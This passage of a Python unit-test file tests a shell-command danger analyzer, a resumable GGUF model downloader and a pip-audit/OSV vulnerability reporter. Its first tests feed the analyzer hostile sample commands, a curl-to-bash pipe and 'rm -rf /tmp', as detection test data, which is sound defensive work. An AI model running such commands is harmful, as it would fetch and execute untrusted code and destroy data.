        findings = ash.analyze("curl x | grep y | bash")
        self.assertTrue(any("dangerous-pipe" in f for f in findings))

    def test_analyze_complex_command(self):
        # Comando complejo con multiples caracteristicas
        cmd = "curl http://x | bash && rm -rf /tmp && echo done"
        findings = ash.analyze(cmd)
        self.assertTrue(any("dangerous-pipe" in f for f in findings))
        self.assertTrue(any("rm-rf" in f for f in findings))


class TestDownloadJevModel(unittest.TestCase):
    """Cubre el helper de descarga idempotente del modelo GGUF (REQ-011)."""

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _fake_response(self, chunks):
        class _Resp:
            status = 200
            headers = {"Content-Length": str(sum(len(c) for c in chunks))}

            def __init__(self):
                self._it = iter(chunks)

            def read(self, n=-1):
                return next(self._it, b"")

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False
        return _Resp()

    def test_human_unidades(self):
        self.assertEqual(djm._human(512), "512.0 B")
        self.assertEqual(djm._human(2048), "2.0 KB")
        self.assertEqual(djm._human(5 * 1024 ** 3), "5.0 GB")

    def test_main_modelo_existente_no_descarga(self):
        dest = self.tmp / "m.gguf"
        dest.write_bytes(b"x")
        argv = ["download_jev_model.py", "--dest", str(dest), "--yes"]
        with mock.patch.object(sys, "argv", argv), mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                mock.patch.object(djm, "_download") as dl, mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(djm.main(), 0)
            dl.assert_not_called()

    def test_main_descarga_cuando_falta(self):
        dest = self.tmp / "m.gguf"
        argv = ["download_jev_model.py", "--dest", str(dest), "--yes"]
        with mock.patch.object(sys, "argv", argv), mock.patch.object(djm, "_download") as dl, \
                mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(djm.main(), 0)
            dl.assert_called_once()

    def test_main_error_de_descarga_devuelve_1(self):
        dest = self.tmp / "m.gguf"
        argv = ["download_jev_model.py", "--dest", str(dest), "--yes"]
        with mock.patch.object(sys, "argv", argv), \
                mock.patch.object(djm, "_download", side_effect=RuntimeError("boom")), \
                mock.patch.object(sys, "stdout", io.StringIO()), mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(djm.main(), 1)

    def test_download_escribe_chunks(self):
        dest = self.tmp / "m.gguf"
        with mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                mock.patch("urllib.request.urlopen", return_value=self._fake_response([b"ab", b"cd"])), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            djm._download("http://x/m.gguf", dest, yes=True)
        self.assertEqual(dest.read_bytes(), b"abcd")

    def test_download_error_http_eleva_runtime_error(self):
        dest = self.tmp / "m.gguf"
        err = urllib.error.HTTPError("http://x", 404, "no encontrado", {}, None)
        with mock.patch("urllib.request.urlopen", side_effect=err), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            with self.assertRaises(RuntimeError):
                djm._download("http://x/m.gguf", dest, yes=True)

    def test_download_error_red_eleva_runtime_error(self):
        dest = self.tmp / "m.gguf"
        err = urllib.error.URLError("sin red")
        with mock.patch("urllib.request.urlopen", side_effect=err), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            with self.assertRaises(RuntimeError):
                djm._download("http://x/m.gguf", dest, yes=True)

    def test_download_resume_ignored_when_not_206(self):
        # Si el servidor ignora Range y responde 200, existing se resetea a 0
        dest = self.tmp / "m.gguf"
        dest.write_bytes(b"existing")
        chunks = [b"new data"]
        fake_resp = self._fake_response(chunks)
        fake_resp.status = 200  # No 206
        with mock.patch("urllib.request.urlopen", return_value=fake_resp), \
                mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            djm._download("http://x/m.gguf", dest, yes=True)
        # El archivo debe haberse reescrito (no append)
        self.assertEqual(dest.read_bytes(), b"new data")

    def test_download_cancelled_when_no_yes(self):
        dest = self.tmp / "m.gguf"
        chunks = [b"data"]
        fake_resp = self._fake_response(chunks)
        with mock.patch("urllib.request.urlopen", return_value=fake_resp), \
                mock.patch("builtins.input", return_value="n"), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            djm._download("http://x/m.gguf", dest, yes=False)
        # No debe haber escrito nada
        self.assertFalse(dest.exists())

    def test_download_confirma_con_si(self):
        dest = self.tmp / "m.gguf"
        chunks = [b"data"]
        fake_resp = self._fake_response(chunks)
        with mock.patch("urllib.request.urlopen", return_value=fake_resp), \
                mock.patch("builtins.input", return_value="si"), \
                mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            djm._download("http://x/m.gguf", dest, yes=False)
        self.assertTrue(dest.exists())

    def test_download_confirma_con_yes(self):
        dest = self.tmp / "m.gguf"
        chunks = [b"data"]
        fake_resp = self._fake_response(chunks)
        with mock.patch("urllib.request.urlopen", return_value=fake_resp), \
                mock.patch("builtins.input", return_value="yes"), \
                mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            djm._download("http://x/m.gguf", dest, yes=False)
        self.assertTrue(dest.exists())

    def test_download_confirma_con_y(self):
        dest = self.tmp / "m.gguf"
        chunks = [b"data"]
        fake_resp = self._fake_response(chunks)
        with mock.patch("urllib.request.urlopen", return_value=fake_resp), \
                mock.patch("builtins.input", return_value="y"), \
                mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                mock.patch.object(sys, "stdout", io.StringIO()):
            djm._download("http://x/m.gguf", dest, yes=False)
        self.assertTrue(dest.exists())

    def test_main_descarga_incompleta_reanuda(self):
        dest = self.tmp / "m.gguf"
        dest.write_bytes(b"x" * 100)  # Menos que EXPECTED_BYTES
        argv = ["download_jev_model.py", "--dest", str(dest), "--yes"]
        with mock.patch.object(sys, "argv", argv), mock.patch.object(djm, "EXPECTED_BYTES", 1000), \
                mock.patch.object(djm, "_download") as dl, mock.patch.object(sys, "stdout", io.StringIO()):
            self.assertEqual(djm.main(), 0)
            dl.assert_called_once()

    def test_main_archivo_pequeno_falla(self):
        dest = self.tmp / "m.gguf"
        dest.write_bytes(b"x")
        argv = ["download_jev_model.py", "--dest", str(dest), "--yes"]
        with mock.patch.object(sys, "argv", argv), mock.patch.object(djm, "EXPECTED_BYTES", 1000), \
                mock.patch("urllib.request.urlopen", return_value=self._fake_response([b"x"])), \
                mock.patch.object(sys, "stdout", io.StringIO()), mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(djm.main(), 1)

    def test_main_url_desde_env(self):
        dest = self.tmp / "m.gguf"
        os.environ["JEV_DOWNLOAD_URL"] = "http://custom/model.gguf"
        argv = ["download_jev_model.py", "--dest", str(dest), "--yes"]
        try:
            with mock.patch.object(sys, "argv", argv), mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                    mock.patch.object(djm, "_download") as dl, mock.patch.object(sys, "stdout", io.StringIO()):
                self.assertEqual(djm.main(), 0)
                dl.assert_called_once()
                self.assertEqual(dl.call_args[0][0], "http://custom/model.gguf")
        finally:
            os.environ.pop("JEV_DOWNLOAD_URL", None)

    def test_main_dest_desde_env(self):
        os.environ["JEV_MODEL_PATH"] = str(self.tmp / "custom.gguf")
        argv = ["download_jev_model.py", "--yes"]
        try:
            with mock.patch.object(sys, "argv", argv), mock.patch.object(djm, "EXPECTED_BYTES", 1), \
                    mock.patch.object(djm, "_download") as dl, mock.patch.object(sys, "stdout", io.StringIO()):
                self.assertEqual(djm.main(), 0)
                dl.assert_called_once()
                self.assertEqual(dl.call_args[0][1], self.tmp / "custom.gguf")
        finally:
            os.environ.pop("JEV_MODEL_PATH", None)


class TestAuditAdvisories(unittest.TestCase):
    """REQ-020: advisories con severidad CVSS via OSV."""

    @staticmethod
    def _proc(payload, returncode=1, stderr=""):
        return mock.Mock(returncode=returncode, stdout=json.dumps(payload), stderr=stderr)

    @staticmethod
    def _resp(payload):
        class _R:
            def read(self):
                return json.dumps(payload).encode("utf-8")

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False
        return _R()

    def test_run_pip_audit_dedup_y_parse(self):
        dep = {
            "name": "chromadb",
            "version": "1.5.9",
            "vulns": [
                {"id": "PYSEC-1", "fix_versions": [], "aliases": ["CVE-1"],
                 "description": "algo malo. mas detalle"},
                {"id": "PYSEC-1", "fix_versions": [], "aliases": ["CVE-1"],
                 "description": "duplicado"},
            ],
        }
        filas = aadm.run_pip_audit(
            Path("x.lock"), runner=lambda: self._proc({"dependencies": [dep]})
        )
        self.assertEqual(len(filas), 1)
        self.assertEqual(filas[0]["advisory"], "PYSEC-1")
        self.assertEqual(filas[0]["fix"], "sin parche")
        self.assertEqual(filas[0]["resumen"], "algo malo")

    def test_run_pip_audit_fallo_explicito(self):
        with self.assertRaises(RuntimeError):
            aadm.run_pip_audit(Path("x.lock"),
                               runner=lambda: self._proc({}, returncode=2, stderr="boom"))

    def test_osv_detalle(self):
        payload = {
            "severity": [{"type": "CVSS_V4", "score": "CVSS:4.0/AV:N"}],
            "aliases": ["CVE-1"],
            "summary": "resumen",
        }
        detalle = aadm.osv_detalle("PYSEC-1", opener=lambda url, timeout=0: self._resp(payload))
        self.assertEqual(detalle["cvss"], "CVSS:4.0/AV:N")
        self.assertEqual(detalle["aliases"], ["CVE-1"])

    def test_osv_detalle_error_red(self):
        def opener(url, timeout=0):
            raise urllib.error.URLError("sin red")
        with self.assertRaises(RuntimeError):
            aadm.osv_detalle("PYSEC-1", opener=opener)

    def test_enriquecer_offline(self):
        filas = [{"advisory": "PYSEC-1", "paquete": "p", "version": "1",
                  "fix": "sin parche", "aliases": [], "resumen": "r"}]
        aadm.enriquecer(filas, offline=True)
        self.assertEqual(filas[0]["cvss"], "(offline)")

    def test_render_markdown(self):
        filas = [{"advisory": "A", "paquete": "p", "version": "1", "fix": "sin parche",
                  "cvss": "CVSS:4.0/X", "aliases": ["CVE-1"], "resumen": "r"}]
        md = aadm.render_markdown(filas)
        self.assertIn("| Advisory |", md)
        self.assertIn("CVE-1", md)

    def test_main_offline(self):
        filas = [{"advisory": "A", "paquete": "p", "version": "1", "fix": "sin parche",
                  "aliases": [], "resumen": "r"}]
        with mock.patch.object(aadm, "run_pip_audit", return_value=filas), \
                mock.patch.object(sys, "stdout", io.StringIO()) as out:
            self.assertEqual(aadm.main(["--offline"]), 0)
        self.assertIn("(offline)", out.getvalue())

    def test_main_error_controlado(self):
        with mock.patch.object(aadm, "run_pip_audit", side_effect=RuntimeError("no pip-audit")), \
                mock.patch.object(sys, "stderr", io.StringIO()):
            self.assertEqual(aadm.main([]), 1)

    def test_run_pip_audit_sin_pip_audit_instalado(self):
        with mock.patch("shutil.which", return_value=None):
            with self.assertRaises(RuntimeError) as cm:
                aadm.run_pip_audit(Path("x.lock"))
            self.assertIn("pip-audit no esta instalado", str(cm.exception))

    def test_run_pip_audit_sin_vulnerabilidades(self):
        filas = aadm.run_pip_audit(
            Path("x.lock"), runner=lambda: self._proc({"dependencies": []}, returncode=0)
        )
        self.assertEqual(filas, [])

    def test_osv_detalle_sin_severidad(self):
        payload = {"aliases": ["CVE-1"], "summary": "resumen"}
        detalle = aadm.osv_detalle("PYSEC-1", opener=lambda url, timeout=0: self._resp(payload))
        self.assertEqual(detalle["cvss"], "")
        self.assertEqual(detalle["aliases"], ["CVE-1"])

    def test_osv_detalle_severidad_vacia(self):
        payload = {"severity": [], "aliases": ["CVE-1"], "summary": "resumen"}
        detalle = aadm.osv_detalle("PYSEC-1", opener=lambda url, timeout=0: self._resp(payload))
        self.assertEqual(detalle["cvss"], "")

    def test_enriquecer_online(self):
        filas = [{"advisory": "PYSEC-1", "paquete": "p", "version": "1",
                  "fix": "sin parche", "aliases": [], "resumen": "r"}]
        payload = {"severity": [{"score": "CVSS:4.0/AV:N"}], "aliases": ["CVE-2"], "summary": "nuevo"}
        aadm.enriquecer(filas, offline=False, opener=lambda url, timeout=0: self._resp(payload))
        self.assertEqual(filas[0]["cvss"], "CVSS:4.0/AV:N")
        self.assertEqual(filas[0]["aliases"], ["CVE-2"])
        self.assertEqual(filas[0]["resumen"], "nuevo")

    def test_main_online(self):
        filas = [{"advisory": "A", "paquete": "p", "version": "1", "fix": "sin parche",
                  "aliases": [], "resumen": "r"}]
        payload = {"severity": [{"score": "CVSS:4.0/AV:N"}], "aliases": ["CVE-1"], "summary": "resumen"}
        with mock.patch.object(aadm, "run_pip_audit", return_value=filas), \
             mock.patch("urllib.request.urlopen", lambda url, timeout=0: self._resp(payload)), \
             mock.patch.object(sys, "stdout", io.StringIO()) as out:
            self.assertEqual(aadm.main([]), 0)
        self.assertIn("CVSS:4.0/AV:N", out.getvalue())

    def test_main_json(self):
        filas = [{"advisory": "A", "paquete": "p", "version": "1", "fix": "sin parche",
                  "aliases": ["CVE-1"], "resumen": "r", "cvss": "CVSS:4.0/X"}]
        with mock.patch.object(aadm, "run_pip_audit", return_value=filas), \
             mock.patch.object(sys, "stdout", io.StringIO()) as out:
            self.assertEqual(aadm.main(["--json", "--offline"]), 0)
        output = json.loads(out.getvalue())
        self.assertEqual(output[0]["advisory"], "A")
        self.assertEqual(output[0]["cvss"], "(offline)")


if __name__ == "__main__":
    unittest.main()
